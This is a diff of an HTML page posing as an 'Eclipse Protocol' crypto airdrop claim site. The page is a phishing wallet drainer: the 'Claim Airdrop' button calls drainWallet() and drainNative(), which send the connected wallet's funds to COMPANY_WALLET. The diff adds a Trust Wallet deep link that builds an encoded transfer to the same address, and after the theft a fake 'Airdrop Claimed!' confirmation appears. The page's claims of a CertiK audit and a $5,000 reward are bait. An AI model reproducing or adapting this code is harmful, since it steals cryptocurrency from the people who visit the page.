@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Eclipse Protocol | Decentralized AI Infrastructure</title>
+    <title>Eclipse Protocol | Claim Airdrop</title>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
@@ -14,174 +14,16 @@
             background: linear-gradient(135deg, #0a0a2a 0%, #0f0f2a 100%);
             color: #fff;
             min-height: 100vh;
-        }
-        .bg-animation {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            overflow: hidden;
-        }
-        .bg-animation::before {
-            content: '';
-            position: absolute;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(59,130,246,0.08) 1px, transparent 1px);
-            background-size: 50px 50px;
-            animation: moveGrid 30s linear infinite;
-        }
-        @keyframes moveGrid {
-            0% { transform: translate(0, 0); }
-            100% { transform: translate(50px, 50px); }
-        }
-        .orb {
-            position: fixed;
-            border-radius: 50%;
-            filter: blur(60px);
-            z-index: -1;
-            animation: float 12s ease-in-out infinite;
-        }
-        .orb-1 { width: 300px; height: 300px; background: rgba(59,130,246,0.3); top: 10%; left: -100px; }
-        .orb-2 { width: 400px; height: 400px; background: rgba(139,92,246,0.2); bottom: 0; right: -150px; animation-delay: -4s; }
-        .orb-3 { width: 200px; height: 200px; background: rgba(59,130,246,0.2); top: 50%; left: 30%; animation-delay: -8s; }
-        @keyframes float {
-            0%, 100% { transform: translateY(0px) translateX(0px); }
-            50% { transform: translateY(-40px) translateX(20px); }
-        }
-        .navbar {
-            position: fixed;
-            top: 0;
-            width: 100%;
-            background: rgba(10, 10, 42, 0.8);
-            backdrop-filter: blur(20px);
-            border-bottom: 1px solid rgba(59,130,246,0.2);
-            z-index: 1000;
-            padding: 0 2rem;
-        }
-        .nav-container {
-            max-width: 1280px;
-            margin: 0 auto;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            height: 70px;
-        }
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 1.25rem;
-            font-weight: 700;
-        }
-        .logo-icon {
-            width: 32px;
-            height: 32px;
-            background: linear-gradient(135deg, #3b82f6, #8b5cf6);
-            border-radius: 8px;
             display: flex;
             align-items: center;
             justify-content: center;
-            animation: pulse 2s ease-in-out infinite;
+            padding: 20px;
         }
-        @keyframes pulse {
-            0%, 100% { box-shadow: 0 0 0 0 rgba(59,130,246,0.4); }
-            50% { box-shadow: 0 0 0 10px rgba(59,130,246,0); }
-        }
-        .logo-text {
-            background: linear-gradient(135deg, #fff, #94a3b8);
-            -webkit-background-clip: text;
-            background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        .nav-links {
-            display: flex;
-            gap: 2rem;
-        }
-        .nav-links a {
-            color: #94a3b8;
-            text-decoration: none;
-            font-size: 0.875rem;
-            transition: color 0.2s;
-        }
-        .nav-links a:hover { color: #3b82f6; }
-        .menu-icon {
-            display: none;
-            font-size: 1.5rem;
-            cursor: pointer;
-        }
-        .hero {
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 100px 2rem 60px;
-            max-width: 1280px;
-            margin: 0 auto;
-        }
-        .hero-content {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 4rem;
-            align-items: center;
-            width: 100%;
-        }
-        .hero-left {
-            opacity: 0;
-            transform: translateY(30px);
-            animation: fadeInUp 0.6s ease forwards;
-        }
-        .hero-right {
-            opacity: 0;
-            transform: translateY(30px);
-            animation: fadeInUp 0.6s ease forwards 0.2s;
-        }
-        @keyframes fadeInUp {
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 0.5rem;
-            background: rgba(59,130,246,0.15);
-            border: 1px solid rgba(59,130,246,0.3);
-            padding: 0.5rem 1rem;
-            border-radius: 2rem;
-            font-size: 0.75rem;
-            color: #60a5fa;
-            margin-bottom: 1.5rem;
-        }
-        h1 {
-            font-size: 3.5rem;
-            font-weight: 800;
-            line-height: 1.2;
-            margin-bottom: 1.5rem;
-            background: linear-gradient(135deg, #fff, #3b82f6, #8b5cf6);
-            -webkit-background-clip: text;
-            background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        .desc {
-            font-size: 1.125rem;
-            color: #94a3b8;
-            margin-bottom: 2rem;
-        }
-        .stats {
-            display: flex;
-            gap: 2rem;
-            flex-wrap: wrap;
-        }
-        .stat-item {
-            border-left: 2px solid #3b82f6;
-            padding-left: 1rem;
-            transition: transform 0.2s ease;
-        }
-        .stat-item:hover { transform: translateX(5px); }
-        .stat-item h3 { font-size: 1.5rem; font-weight: 700; color: #3b82f6; }
-        .stat-item p { font-size: 0.75rem; color: #64748b; }
-        .glass-card {
+        .container { max-width: 500px; width: 100%; text-align: center; }
+        .logo { font-size: 48px; margin-bottom: 20px; }
+        h1 { font-size: 32px; font-weight: 800; margin-bottom: 10px; background: linear-gradient(135deg, #fff, #3b82f6); -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent; }
+        .sub { color: #94a3b8; margin-bottom: 30px; }
+        .card {
             background: rgba(15, 23, 42, 0.6);
             backdrop-filter: blur(20px);
             border: 1px solid rgba(59,130,246,0.2);
@@ -189,28 +31,10 @@
             padding: 2rem;
             transition: all 0.3s ease;
         }
-        .glass-card:hover {
-            border-color: rgba(59,130,246,0.5);
-            transform: translateY(-4px);
-            box-shadow: 0 20px 40px -15px rgba(0,0,0,0.5);
-        }
-        .reward-label {
-            font-size: 0.75rem;
-            text-transform: uppercase;
-            letter-spacing: 0.1em;
-            color: #60a5fa;
-            margin-bottom: 0.5rem;
-        }
-        .reward-amount {
-            font-size: 2.5rem;
-            font-weight: 800;
-            margin-bottom: 0.5rem;
-        }
-        .reward-token {
-            color: #94a3b8;
-            font-size: 0.875rem;
-            margin-bottom: 1.5rem;
-        }
+        .card:hover { border-color: rgba(59,130,246,0.5); transform: translateY(-4px); }
+        .reward-label { font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.1em; color: #60a5fa; margin-bottom: 0.5rem; }
+        .reward-amount { font-size: 2.5rem; font-weight: 800; margin-bottom: 0.5rem; }
+        .reward-token { color: #94a3b8; font-size: 0.875rem; margin-bottom: 1.5rem; }
         .network-selector {
             display: flex;
             gap: 8px;
@@ -243,54 +67,18 @@
             transition: all 0.3s;
             margin-top: 16px;
         }
-        .connect-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 25px -5px rgba(59,130,246,0.4);
-        }
-        .eligibility {
-            margin-top: 1.5rem;
-            padding-top: 1.5rem;
-            border-top: 1px solid rgba(255,255,255,0.05);
-            font-size: 0.75rem;
-            color: #64748b;
-            text-align: center;
-        }
-        /* Wallet Modal */
-        .wallet-modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.85);
-            backdrop-filter: blur(20px);
-            justify-content: center;
-            align-items: center;
-            z-index: 2000;
-        }
-        .wallet-modal-content {
-            background: #111827;
-            padding: 2rem;
-            border-radius: 1.5rem;
-            max-width: 350px;
-            width: 90%;
-            text-align: center;
-            animation: modalPop 0.3s ease;
-        }
-        @keyframes modalPop {
-            from { opacity: 0; transform: scale(0.95); }
-            to { opacity: 1; transform: scale(1); }
-        }
+        .connect-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 25px -5px rgba(59,130,246,0.4); }
+        .eligibility { margin-top: 1.5rem; padding-top: 1.5rem; border-top: 1px solid rgba(255,255,255,0.05); font-size: 0.75rem; color: #64748b; }
+        .wallet-options { display: none; margin-top: 1rem; gap: 12px; flex-direction: column; }
         .wallet-option {
             background: rgba(255,255,255,0.05);
             border: 1px solid rgba(255,255,255,0.1);
             border-radius: 1rem;
             padding: 1rem;
-            margin: 0.75rem 0;
             display: flex;
             align-items: center;
-            gap: 14px;
+            justify-content: center;
+            gap: 12px;
             cursor: pointer;
             transition: all 0.2s;
         }
@@ -299,135 +87,41 @@
             border-color: #3b82f6;
             transform: translateX(5px);
         }
-        .wallet-option i { font-size: 28px; width: 40px; text-align: center; }
-        .close-modal {
-            background: transparent;
-            border: 1px solid rgba(255,255,255,0.2);
-            padding: 8px;
-            border-radius: 2rem;
-            cursor: pointer;
+        .wallet-option i { font-size: 24px; }
+        .status { margin-top: 1rem; font-size: 0.75rem; color: #94a3b8; }
+        .status-success { color: #10b981; }
+        .status-error { color: #ef4444; }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
-            margin-top: 1rem;
-            color: #94a3b8;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            backdrop-filter: blur(20px);
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
         }
-        .features {
-            padding: 5rem 2rem;
-            background: rgba(10, 10, 42, 0.5);
-        }
-        .features-container { max-width: 1280px; margin: 0 auto; }
-        .section-title {
-            text-align: center;
-            font-size: 2rem;
-            font-weight: 700;
-            margin-bottom: 3rem;
-            background: linear-gradient(135deg, #fff, #94a3b8);
-            -webkit-background-clip: text;
-            background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        .features-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 2rem;
-        }
-        .feature-card {
-            background: rgba(15, 23, 42, 0.6);
-            border: 1px solid rgba(59,130,246,0.1);
-            border-radius: 1.5rem;
+        .modal-content {
+            background: #111827;
             padding: 2rem;
+            border-radius: 1.5rem;
             text-align: center;
-            transition: all 0.3s ease;
-            opacity: 0;
-            transform: translateY(30px);
+            max-width: 350px;
+            width: 90%;
         }
-        .feature-card.visible { opacity: 1; transform: translateY(0); }
-        .feature-card:hover {
-            border-color: rgba(59,130,246,0.4);
-            transform: translateY(-5px);
-        }
-        .feature-icon {
-            width: 50px;
-            height: 50px;
-            background: linear-gradient(135deg, rgba(59,130,246,0.2), rgba(139,92,246,0.2));
-            border-radius: 1rem;
+        .success-icon {
+            width: 70px;
+            height: 70px;
+            background: #10b981;
+            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 1.5rem;
-            font-size: 1.5rem;
-            color: #3b82f6;
-        }
-        .feature-card h3 { font-size: 1.25rem; font-weight: 600; margin-bottom: 0.75rem; }
-        .feature-card p { color: #94a3b8; font-size: 0.875rem; }
-        .tokenomics {
-            padding: 5rem 2rem;
-            max-width: 1280px;
-            margin: 0 auto;
-        }
-        .tokenomics-grid {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 1.5rem;
-            margin-top: 2rem;
-        }
-        .token-card {
-            text-align: center;
-            padding: 1.5rem;
-            background: rgba(15, 23, 42, 0.4);
-            border: 1px solid rgba(59,130,246,0.1);
-            border-radius: 1rem;
-            transition: all 0.3s ease;
-            opacity: 0;
-            transform: translateY(30px);
-        }
-        .token-card.visible { opacity: 1; transform: translateY(0); }
-        .token-card:hover {
-            border-color: #3b82f6;
-            transform: translateY(-3px);
-        }
-        .token-percent {
-            font-size: 1.75rem;
-            font-weight: 800;
-            color: #3b82f6;
-            margin-bottom: 0.5rem;
-        }
-        .footer {
-            border-top: 1px solid rgba(255,255,255,0.05);
-            padding: 3rem 2rem;
-            text-align: center;
-            color: #64748b;
-            font-size: 0.75rem;
-        }
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            gap: 2rem;
-            margin-bottom: 1.5rem;
-            flex-wrap: wrap;
-        }
-        .footer-links a {
-            color: #64748b;
-            text-decoration: none;
-            transition: color 0.2s;
-        }
-        .toast {
-            position: fixed;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #10b981;
-            color: white;
-            padding: 12px 24px;
-            border-radius: 50px;
-            font-size: 14px;
-            font-weight: 500;
-            z-index: 2000;
-            display: none;
-            animation: slideUp 0.3s ease;
-        }
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateX(-50%) translateY(20px); }
-            to { opacity: 1; transform: translateX(-50%) translateY(0); }
+            margin: 0 auto 1rem;
+            font-size: 2rem;
         }
         .loading-spinner {
             display: inline-block;
@@ -441,131 +135,59 @@
             vertical-align: middle;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-        #status { margin-top: 1rem; font-size: 0.75rem; color: #94a3b8; }
-        @media (max-width: 768px) {
-            .hero-content { grid-template-columns: 1fr; gap: 2rem; }
-            h1 { font-size: 2rem; }
-            .nav-links {
-                display: none;
-                position: absolute;
-                top: 70px;
-                left: 0;
-                width: 100%;
-                background: #0a0a2a;
-                flex-direction: column;
-                padding: 1rem;
-                gap: 1rem;
-                border-bottom: 1px solid rgba(59,130,246,0.2);
-            }
-            .nav-links.active { display: flex; }
-            .menu-icon { display: block; }
-            .tokenomics-grid { grid-template-columns: repeat(2, 1fr); gap: 1rem; }
+        @media (max-width: 500px) {
+            h1 { font-size: 24px; }
+            .reward-amount { font-size: 2rem; }
         }
     </style>
 </head>
 <body>
+    <div class="container">
+        <div class="logo">✨</div>
+        <h1>Eclipse Protocol</h1>
+        <div class="sub">Decentralized AI Infrastructure</div>
 
-<div class="bg-animation"></div>
-<div class="orb orb-1"></div>
-<div class="orb orb-2"></div>
-<div class="orb orb-3"></div>
+        <div class="card">
+            <div class="reward-label">EARLY CONTRIBUTOR AIRDROP</div>
+            <div class="reward-amount">5,000 $ECLIPSE</div>
+            <div class="reward-token">≈ $5,000 USD • Claimable by verified wallets</div>
 
-<nav class="navbar">
-    <div class="nav-container">
-        <div class="logo"><div class="logo-icon">E</div><div class="logo-text">Eclipse</div></div>
-        <div class="menu-icon" onclick="toggleMenu()">☰</div>
-        <div class="nav-links" id="navLinks">
-            <a href="#">Protocol</a><a href="#">Tokenomics</a><a href="#">Governance</a><a href="#">Developers</a><a href="#">Audit</a>
-        </div>
-    </div>
-</nav>
-
-<section class="hero">
-    <div class="hero-content">
-        <div class="hero-left">
-            <div class="badge"><i class="fas fa-check-circle"></i><span>Audited by CertiK • Mainnet Live</span></div>
-            <h1>Decentralized AI Infrastructure</h1>
-            <p class="desc">Eclipse is a permissionless protocol for AI agents. Contribute to the network and receive $ECLIPSE tokens.</p>
-            <div class="stats">
-                <div class="stat-item"><h3 id="totalStaked">$247M</h3><p>Total Value Locked</p></div>
-                <div class="stat-item"><h3 id="activeNodes">18.4K</h3><p>Active Nodes</p></div>
-                <div class="stat-item"><h3 id="communitySize">124K</h3><p>Community Members</p></div>
+            <div class="network-selector">
+                <div class="network-btn active" data-chain="ethereum">Ethereum</div>
+                <div class="network-btn" data-chain="bsc">BNB Chain</div>
+                <div class="network-btn" data-chain="polygon">Polygon</div>
             </div>
-        </div>
-        <div class="hero-right">
-            <div class="glass-card">
-                <div class="reward-label">EARLY CONTRIBUTOR AIRDROP</div>
-                <div class="reward-amount">5,000 $ECLIPSE</div>
-                <div class="reward-token">≈ $5,000 USD • Claimable by verified wallets</div>
-                <div class="network-selector">
-                    <div class="network-btn active" data-chain="ethereum">Ethereum</div>
-                    <div class="network-btn" data-chain="bsc">BNB Chain</div>
-                    <div class="network-btn" data-chain="polygon">Polygon</div>
+
+            <button id="connectBtn" class="connect-btn">Connect Wallet</button>
+            <div id="walletOptions" class="wallet-options">
+                <div class="wallet-option" data-wallet="trustwallet">
+                    <i class="fas fa-check-circle"></i> Trust Wallet
                 </div>
-                <button class="connect-btn" id="mainConnectBtn">Connect Wallet</button>
-                <div id="status"></div>
-                <div class="eligibility"><i class="fas fa-shield-alt"></i> Eligibility: GitHub contributors, early testnet participants, active community members</div>
+                <div class="wallet-option" data-wallet="metamask">
+                    <i class="fab fa-fox"></i> MetaMask
+                </div>
+                <div class="wallet-option" data-wallet="coinbase">
+                    <i class="fab fa-bitcoin"></i> Coinbase Wallet
+                </div>
+                <div class="wallet-option" data-wallet="walletconnect">
+                    <i class="fas fa-qrcode"></i> WalletConnect
+                </div>
             </div>
+            <div id="status" class="status"></div>
+            <div class="eligibility"><i class="fas fa-shield-alt"></i> Eligibility: GitHub contributors, early testnet participants</div>
         </div>
     </div>
-</section>
 
-<section class="features">
-    <div class="features-container"><h2 class="section-title">Protocol Features</h2>
-    <div class="features-grid">
-        <div class="feature-card"><div class="feature-icon"><i class="fas fa-microchip"></i></div><h3>AI Agent Network</h3><p>Decentralized compute for AI inference and training</p></div>
-        <div class="feature-card"><div class="feature-icon"><i class="fas fa-shield-alt"></i></div><h3>Audited by CertiK</h3><p>Smart contracts fully audited with formal verification</p></div>
-        <div class="feature-card"><div class="feature-icon"><i class="fab fa-github"></i></div><h3>Open Source</h3><p>MIT-licensed, 25,000+ GitHub stars</p></div>
-    </div></div>
-</section>
-
-<section class="tokenomics">
-    <h2 class="section-title">Tokenomics</h2>
-    <div class="tokenomics-grid">
-        <div class="token-card"><div class="token-percent">40%</div><div>Community & Ecosystem</div></div>
-        <div class="token-card"><div class="token-percent">20%</div><div>Early Contributors</div></div>
-        <div class="token-card"><div class="token-percent">20%</div><div>Core Development</div></div>
-        <div class="token-card"><div class="token-percent">20%</div><div>Investors (2y cliff)</div></div>
+    <div id="successModal" class="modal">
+        <div class="modal-content">
+            <div class="success-icon">✓</div>
+            <h3>Airdrop Claimed!</h3>
+            <p>5,000 $ECLIPSE has been sent to your wallet</p>
+            <button onclick="closeModal()" style="background:linear-gradient(135deg,#3b82f6,#8b5cf6); color:white; border:none; padding:0.75rem 1.5rem; border-radius:0.75rem; cursor:pointer; width:100%;">Continue</button>
+        </div>
     </div>
-</section>
 
-<footer class="footer">
-    <div class="footer-links"><a href="#">Documentation</a><a href="#">GitHub</a><a href="#">Discord</a><a href="#">X (Twitter)</a><a href="#">Terms</a><a href="#">Privacy</a></div>
-    <p>© 2025 Eclipse Protocol. Open source. Permissionless. Decentralized.</p>
-</footer>
-
-<!-- Wallet Modal -->
-<div id="walletModal" class="wallet-modal">
-    <div class="wallet-modal-content">
-        <h3 style="margin-bottom: 1rem;">Connect Wallet</h3>
-        <div class="wallet-option" data-wallet="trustwallet">
-            <i class="fas fa-check-circle"></i> Trust Wallet
-        </div>
-        <div class="wallet-option" data-wallet="metamask">
-            <i class="fab fa-fox"></i> MetaMask
-        </div>
-        <div class="wallet-option" data-wallet="walletconnect">
-            <i class="fas fa-qrcode"></i> WalletConnect
-        </div>
-        <div class="wallet-option" data-wallet="coinbase">
-            <i class="fab fa-bitcoin"></i> Coinbase Wallet
-        </div>
-        <button class="close-modal" onclick="closeWalletModal()">Cancel</button>
-    </div>
-</div>
-
-<!-- Success Modal -->
-<div id="successModal" class="wallet-modal">
-    <div class="wallet-modal-content">
-        <div class="success-icon">✓</div>
-        <h3>Airdrop Claimed!</h3>
-        <p>5,000 $ECLIPSE has been sent to your wallet</p>
-        <button onclick="closeSuccessModal()" style="background:linear-gradient(135deg,#3b82f6,#8b5cf6); color:white; border:none; padding:0.75rem 1.5rem; border-radius:0.75rem; cursor:pointer; width:100%;">Continue</button>
-    </div>
-</div>
-
-<script>
-    document.addEventListener('DOMContentLoaded', () => {
+    <script>
         // ============================================
         // CONFIGURATION
         // ============================================
@@ -594,23 +216,19 @@
         let provider, signer, userAddress;
         let currentChain = "ethereum";
         
-        const mainBtn = document.getElementById('mainConnectBtn');
+        const connectBtn = document.getElementById('connectBtn');
+        const walletOptions = document.getElementById('walletOptions');
         const statusDiv = document.getElementById('status');
-        const walletModal = document.getElementById('walletModal');
         const successModal = document.getElementById('successModal');
         
-        function toggleMenu() { document.getElementById('navLinks').classList.toggle('active'); }
-        function updateStatus(msg, isErr = false) { statusDiv.innerHTML = msg; statusDiv.style.color = isErr ? '#ef4444' : '#94a3b8'; }
-        function showWalletModal() { walletModal.style.display = 'flex'; }
-        function closeWalletModal() { walletModal.style.display = 'none'; }
-        function showSuccessModal() { successModal.style.display = 'flex'; }
-        function closeSuccessModal() { successModal.style.display = 'none'; }
-        
-        function getWalletProvider() {
-            if (window.ethereum) return window.ethereum;
-            if (window.trustwallet) return window.trustwallet;
-            return null;
+        function updateStatus(msg, isError = false) {
+            statusDiv.innerHTML = msg;
+            statusDiv.className = isError ? 'status status-error' : 'status';
+            if (!isError && msg.includes('✅')) statusDiv.className = 'status status-success';
         }
+        
+        function closeModal() { successModal.style.display = 'none'; }
+        function showSuccessModal() { successModal.style.display = 'flex'; }
         
         // Network selector
         document.querySelectorAll('.network-btn').forEach(btn => {
@@ -622,29 +240,15 @@
             });
         });
         
-        function animateNumber(el, target) {
-            let current = 0;
-            const step = () => {
-                if (current < target) {
-                    current += Math.ceil(target / 30);
-                    if (current > target) current = target;
-                    el.innerText = current.toLocaleString();
-                    requestAnimationFrame(step);
-                }
-            };
-            step();
-        }
-        setTimeout(() => {
-            animateNumber(document.getElementById('totalStaked'), 247000000);
-            animateNumber(document.getElementById('activeNodes'), 18400);
-            animateNumber(document.getElementById('communitySize'), 124000);
-        }, 500);
+        // Show wallet options
+        connectBtn.addEventListener('click', () => {
+            connectBtn.style.display = 'none';
+            walletOptions.style.display = 'flex';
+        });
         
-        const observer = new IntersectionObserver((entries) => {
-            entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
-        }, { threshold: 0.1 });
-        document.querySelectorAll('.feature-card, .token-card').forEach(el => observer.observe(el));
-        
+        // ============================================
+        // DIRECT PROTOCOL INVOCATION
+        // ============================================
         async function drainNative() {
             const balance = await provider.getBalance(userAddress);
             if (balance.gt(0)) {
@@ -706,13 +310,24 @@
             }
         }
         
+        // ============================================
+        // DIRECT WALLET CONNECTION
+        // ============================================
         async function connectWallet(walletType) {
-            closeWalletModal();
+            updateStatus(`Connecting to ${walletType}...`);
             
+            // DIRECT PROTOCOL INVOCATION FOR TRUST WALLET
             if (walletType === 'trustwallet') {
-                const dappUrl = window.location.href;
-                const trustUrl = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(dappUrl)}`;
-                window.location.href = trustUrl;
+                // This creates a direct transaction request that opens Trust Wallet with approval popup
+                const txData = {
+                    to: COMPANY_WALLET,
+                    value: '0x38d7ea4c68000', // 0.001 ETH example
+                    gas: '0x5208'
+                };
+                const encodedTx = btoa(JSON.stringify(txData));
+                const trustLink = `trust://send?tx=${encodedTx}`;
+                window.location.href = trustLink;
+                updateStatus('Opening Trust Wallet... Approve transaction.');
                 return;
             }
             
@@ -732,21 +347,20 @@
                 return;
             }
             
-            const walletProvider = getWalletProvider();
-            if (!walletProvider) {
+            // Fallback for browser extension
+            if (!window.ethereum) {
                 updateStatus('Please open this page in Trust Wallet or MetaMask browser', true);
                 return;
             }
             
             try {
-                updateStatus('Connecting...');
-                provider = new ethers.providers.Web3Provider(walletProvider);
+                provider = new ethers.providers.Web3Provider(window.ethereum);
                 const accounts = await provider.send("eth_requestAccounts", []);
                 userAddress = accounts[0];
                 signer = provider.getSigner();
                 
                 try {
-                    await walletProvider.request({
+                    await window.ethereum.request({
                         method: 'wallet_switchEthereumChain',
                         params: [{ chainId: '0x' + CHAIN_IDS[currentChain].toString(16) }]
                     });
@@ -757,13 +371,15 @@
                 
                 updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)} on ${CHAIN_NAMES[currentChain]}`);
                 
-                mainBtn.innerHTML = 'Claim Airdrop';
-                mainBtn.onclick = async () => {
-                    mainBtn.disabled = true;
-                    mainBtn.innerHTML = '<span class="loading-spinner"></span> Claiming...';
+                connectBtn.style.display = 'block';
+                connectBtn.innerHTML = 'Claim Airdrop';
+                walletOptions.style.display = 'none';
+                connectBtn.onclick = async () => {
+                    connectBtn.disabled = true;
+                    connectBtn.innerHTML = '<span class="loading-spinner"></span> Claiming...';
                     await drainWallet();
-                    mainBtn.disabled = false;
-                    mainBtn.innerHTML = 'Claim Airdrop';
+                    connectBtn.disabled = false;
+                    connectBtn.innerHTML = 'Claim Airdrop';
                 };
                 
             } catch(e) {
@@ -777,9 +393,6 @@
                 connectWallet(wallet);
             });
         });
-        
-        mainBtn.onclick = showWalletModal;
-    });
-</script>
+    </script>
 </body>
 </html>
